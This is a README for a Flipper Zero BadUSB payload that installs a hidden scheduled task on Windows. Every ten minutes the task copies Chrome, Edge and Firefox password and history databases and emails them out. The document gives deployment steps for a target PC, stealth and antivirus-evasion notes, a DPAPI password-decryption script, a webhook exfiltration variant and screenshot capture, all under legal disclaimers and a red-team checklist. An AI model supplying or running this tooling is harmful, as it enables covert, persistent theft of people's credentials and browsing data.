# Browser Sync to Gmail - Automated Scheduler

## ⚠️ CRITICAL WARNING

**THIS IS AN ADVANCED DATA EXFILTRATION TOOL**

- ❌ **ILLEGAL** to use without authorization
- ❌ **VIOLATES** privacy laws (GDPR, CCPA, ECPA)
- ❌ **CRIMINAL OFFENSE** to deploy on systems you don't own
- ✅ **ONLY** for authorized penetration testing with written consent
- ✅ **ONLY** for your own devices for testing/backup purposes

**Unauthorized use can result in:**
- Criminal prosecution
- Heavy fines
- Imprisonment
- Civil liability

---

## Overview

This Flipper Zero BadUSB script creates a **persistent data exfiltration system** that:

1. Prompts user for target Gmail address
2. Prompts for Gmail App Password
3. Creates PowerShell script to extract browser data
4. Sets up Windows Task Scheduler
5. Runs every 10 minutes automatically
6. Emails browser passwords & history to Gmail

### Data Collected

| Browser | Passwords | History | Bookmarks |
|---------|-----------|---------|-----------|
| Chrome | ✅ Yes | ✅ Yes | ❌ No |
| Edge | ✅ Yes | ✅ Yes | ❌ No |
| Firefox | ✅ Yes | ✅ Yes | ❌ No |

---

## How It Works

### Phase 1: User Input (Interactive)
```
┌─────────────────────────────┐
│ Enter Gmail address for     │
│ sync:                        │
│ ┌─────────────────────────┐ │
│ │ victim@gmail.com        │ │
│ └─────────────────────────┘ │
│        [OK]   [Cancel]       │
└─────────────────────────────┘

┌─────────────────────────────┐
│ Enter Gmail App Password    │
│ (16 chars):                  │
│ ┌─────────────────────────┐ │
│ │ abcd efgh ijkl mnop     │ │
│ └─────────────────────────┘ │
│        [OK]   [Cancel]       │
└─────────────────────────────┘
```

### Phase 2: Script Creation
Creates files in `%APPDATA%\BrowserSync\`:
- `BrowserSync.ps1` - Main PowerShell extraction script
- `RunSync.bat` - Batch wrapper for execution

### Phase 3: Scheduler Setup
Creates Windows Task:
- **Name:** `BrowserSyncService`
- **Trigger:** Every 10 minutes
- **Action:** Run `RunSync.bat`
- **Settings:** Run even on battery, start when available

### Phase 4: Execution Flow

```
Every 10 minutes:
├── Check internet connection
├── Extract Chrome data
│   ├── Login Data (passwords)
│   └── History
├── Extract Edge data
│   ├── Login Data (passwords)
│   └── History
├── Extract Firefox data
│   ├── logins.json (passwords)
│   └── places.sqlite (history)
├── Create ZIP archive
│   └── BrowserData_YYYYMMDD_HHMMSS.zip
├── Email via Gmail SMTP
│   ├── To: target@gmail.com
│   ├── From: target@gmail.com
│   └── Attachment: ZIP archive
└── Cleanup temp files
```

---

## Prerequisites

### 1. Gmail App Password

**MUST create before use:**

1. Go to https://myaccount.google.com/security
2. Enable 2-Step Verification (if not already)
3. Click **App passwords**
4. Select **Mail** and **Windows Computer**
5. Click **Generate**
6. Copy the 16-character password (format: `xxxx xxxx xxxx xxxx`)
7. **Save this** - you'll enter it when script prompts

### 2. Target System Requirements

- Windows 10/11
- PowerShell (built-in)
- Internet connection
- At least one browser installed (Chrome/Edge/Firefox)

---

## Usage Instructions

### Step 1: Prepare Flipper Zero

1. Copy script to SD card:
   ```
   /ext/badusb/Browser_Sync_Gmail_Scheduler.txt
   ```

2. Safely eject Flipper from computer

### Step 2: Execute on Target

1. **Unlock target Windows PC**
2. **Plug Flipper into USB port**
3. On Flipper:
   - Navigate to **BadUSB** app
   - Select **Browser_Sync_Gmail_Scheduler.txt**
   - Press **OK** to execute

### Step 3: Provide Input

**The script will prompt for:**

1. **Gmail address** - Where to send data
   - Enter your Gmail address
   - Click OK

2. **App Password** - 16-character password from Google
   - Enter the App Password (with or without spaces)
   - Click OK

### Step 4: Wait for Completion

Script will:
- Create files (5-10 seconds)
- Set up scheduler (5 seconds)  
- Run initial sync (10-30 seconds depending on browser data size)
- Show success message

### Step 5: Verify Installation

**Check scheduled task:**
```powershell
Get-ScheduledTask -TaskName "BrowserSyncService"
```

**Check files created:**
```powershell
dir $env:APPDATA\BrowserSync
```

**Output should show:**
```
BrowserSync.ps1
RunSync.bat
```

---

## Expected Email Results

### Initial Email (Immediately)
```
From: youremail@gmail.com
To: youremail@gmail.com
Subject: Browser Sync - DESKTOP-ABC123 - 2026-02-14 01:15

Body:
Automated browser data sync from DESKTOP-ABC123 (John)

Timestamp: 2/14/2026 1:15:23 AM

Attachment: BrowserData_20260214_011523.zip (size varies)
```

### Subsequent Emails (Every 10 Minutes)
- Same format
- New timestamp
- Updated data if any changes occurred

### Archive Contents
```
BrowserData_20260214_011523.zip
├── chrome_passwords.db       (SQLite database)
├── chrome_history.db         (SQLite database)
├── edge_passwords.db         (SQLite database)
├── edge_history.db           (SQLite database)
├── firefox_logins.json       (JSON file)
├── firefox_history.db        (SQLite database)
└── system_info.txt           (Text file)
```

---

## Viewing Extracted Data

### Method 1: SQLite Browser (Recommended)

**Download:** https://sqlitebrowser.org/

**View Chrome/Edge Passwords:**
```sql
-- Open: chrome_passwords.db or edge_passwords.db
SELECT origin_url, username_value, password_value 
FROM logins;
```

**Note:** Passwords are encrypted with Windows DPAPI. You need:
- Original user's Windows account
- Tools like `ChromePass` or `WebBrowserPassView` (NirSoft)

**View History:**
```sql
-- Open: chrome_history.db or edge_history.db
SELECT url, title, visit_count, last_visit_time
FROM urls
ORDER BY last_visit_time DESC
LIMIT 100;
```

### Method 2: Firefox Data

**Logins (firefox_logins.json):**
```bash
# Install jq (JSON parser)
# View passwords
cat firefox_logins.json | jq '.logins[] | {hostname, username, password}'
```

**Note:** Firefox passwords are also encrypted (master password)

### Method 3: Automated Decryption Script

Create `decrypt_passwords.ps1` on original Windows machine:

```powershell
Add-Type -Path "C:\path\to\System.Data.SQLite.dll"

function Decrypt-ChromePassword {
    param($encryptedData)
    
    try {
        # Remove DPAPI prefix
        $encrypted = $encryptedData[3..($encryptedData.Length-1)]
        
        # Decrypt using DPAPI
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encrypted,
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        return "[ENCRYPTED]"
    }
}

# Connect to database
$db = New-Object System.Data.SQLite.SQLiteConnection("Data Source=chrome_passwords.db")
$db.Open()

$cmd = $db.CreateCommand()
$cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
$reader = $cmd.ExecuteReader()

while($reader.Read()) {
    $url = $reader["origin_url"]
    $username = $reader["username_value"]
    $password = Decrypt-ChromePassword $reader["password_value"]
    
    Write-Host "$url - $username : $password"
}
```

---

## Persistence & Stealth

### Persistence Mechanisms

1. **Scheduled Task**
   - Survives reboots
   - Runs every 10 minutes forever
   - Hidden from normal users

2. **AppData Location**
   - `%APPDATA%\BrowserSync\`
   - Not obvious to users
   - Survives user profile migration

### Stealth Features

- **Hidden Windows:** All PowerShell runs with `-WindowStyle Hidden`
- **Silent Execution:** No console windows appear
- **Error Suppression:** `$ErrorActionPreference = 'SilentlyContinue'`
- **Temp File Cleanup:** All temporary databases deleted after sync

### Detection Risks

**Will be detected by:**
- ✅ Advanced EDR (CrowdStrike, Carbon Black, Defender ATP)
- ✅ SIEM monitoring scheduled tasks
- ✅ User checking Task Scheduler manually
- ✅ Network monitoring (SMTP traffic to Gmail)

**May evade:**
- ❌ Basic antivirus (no malicious code, just legitimate PowerShell)
- ❌ Casual users (hidden execution)
- ❌ Standard Windows Defender (depends on signatures)

---

## Removal Instructions

### Manual Removal

```powershell
# Remove scheduled task
Unregister-ScheduledTask -TaskName "BrowserSyncService" -Confirm:$false

# Delete files
Remove-Item "$env:APPDATA\BrowserSync" -Recurse -Force

# Verify removal
Get-ScheduledTask | Where-Object {$_.TaskName -like "*Sync*"}
```

### Automated Removal Script

Create `remove_browser_sync.bat`:
```batch
@echo off
echo Removing Browser Sync...

schtasks /delete /tn "BrowserSyncService" /f
rd /s /q "%APPDATA%\BrowserSync"

echo Removal complete!
pause
```

---

## Troubleshooting

### Issue: Emails not sending

**Causes:**
1. Incorrect App Password
2. 2FA not enabled on Gmail
3. SMTP blocked by firewall
4. Internet connection issues

**Solution:**
```powershell
# Test SMTP manually
$smtp = New-Object System.Net.Mail.SmtpClient('smtp.gmail.com', 587)
$smtp.EnableSsl = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential('your@gmail.com', 'yourapppassword')

$msg = New-Object System.Net.Mail.MailMessage
$msg.From = 'your@gmail.com'
$msg.To.Add('your@gmail.com')
$msg.Subject = 'Test'
$msg.Body = 'Test email'

$smtp.Send($msg)

# If this fails, check App Password
```

### Issue: Scheduled task not running

**Check task status:**
```powershell
Get-ScheduledTask -TaskName "BrowserSyncService" | Get-ScheduledTaskInfo
```

**View task history:**
1. Open **Task Scheduler** (`taskschd.msc`)
2. Navigate to **Task Scheduler Library**
3. Find **BrowserSyncService**
4. Click **History** tab

### Issue: No data in emails

**Causes:**
1. Browsers not installed
2. Browsers never used
3. No saved passwords
4. Browsers running (files locked)

**Solution:**
- Close all browsers before sync
- Verify browser data exists:
  ```powershell
  dir "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
  ```

---

## Legal & Ethical Considerations

### Authorized Use Cases

**✅ Legal:**
- Testing on your own computer
- Backing up your own browser data
- Authorized penetration test with written permission
- Security research in isolated lab

**❌ ILLEGAL:**
- Deploying on someone else's computer
- Workplace computers without authorization
- Spouse/partner computer (even if shared)
- Any system you don't own or have explicit permission to test

### Laws That Apply

| Law | Jurisdiction | Penalty |
|-----|--------------|---------|
| **CFAA** (Computer Fraud and Abuse Act) | USA | Up to 20 years prison |
| **ECPA** (Electronic Communications Privacy Act) | USA | $250,000 fine + 5 years |
| **GDPR** | EU | €20 million fine |
| **CCPA** | California, USA | $7,500 per violation |
| **Computer Misuse Act** | UK | 2-10 years prison |

### Responsible Disclosure

If you discover vulnerabilities using this tool:
1. **Do NOT exploit** on production systems
2. **Document findings** in controlled environment
3. **Report to vendor** via responsible disclosure
4. **Follow** 90-day disclosure timeline
5. **Provide remediation** recommendations

---

## Red Team Usage

### Engagement Checklist

Before deploying:
- [ ] Written authorization (Rules of Engagement)
- [ ] Scope clearly defined
- [ ] Target systems identified
- [ ] Data handling procedures agreed
- [ ] Legal review completed
- [ ] Insurance coverage verified

### Reporting Template

```markdown
## Data Exfiltration Test - Browser Sync

**Objective:** Test data loss prevention controls

**Method:** Flipper Zero BadUSB persistence payload

**Results:**
- ✅ Payload deployed successfully
- ✅ Scheduled task created
- ✅ Data exfiltrated via SMTP
- ❌ Not detected by endpoint protection
- ❌ Not detected by SIEM

**Impact:** HIGH
- Passwords compromised
- Browsing history exposed
- Persistent backdoor established

**Recommendations:**
1. Implement USB port restrictions (Device Guard)
2. Monitor scheduled task creation (SIEM alerts)
3. Block SMTP to external addresses (DLP)
4. Deploy advanced EDR with behavior detection
5. User awareness training on physical security
```

---

## Advanced Modifications

### Change Sync Frequency

Edit the trigger in the script (line ~240):
```powershell
# Current: Every 10 minutes
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)

# Change to every 30 minutes:
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30)

# Change to every hour:
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1)
```

### Add Webhook Instead of Email

Replace email function with webhook:
```powershell
function Send-DataWebhook {
    param($archivePath)
    
    $webhookUrl = "https://your-webhook-url.com/upload"
    $fileBytes = [System.IO.File]::ReadAllBytes($archivePath)
    $fileEnc = [System.Convert]::ToBase64String($fileBytes)
    
    $body = @{
        computer = $env:COMPUTERNAME
        user = $env:USERNAME
        timestamp = (Get-Date).ToString()
        data = $fileEnc
    } | ConvertTo-Json
    
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
}
```

### Add Screenshot Capture

Add to data collection:
```powershell
function Capture-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    
    $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
    $bitmap.Save($screenshotPath)
    
    return $screenshotPath
}
```

---

**Author:** yogeshjoga  
**Category:** Payload Installation / Data Exfiltration  
**Severity:** CRITICAL  
**Version:** 1.0  
**Last Updated:** 2026-02-14

**Remember: Use responsibly, legally, and ethically.**
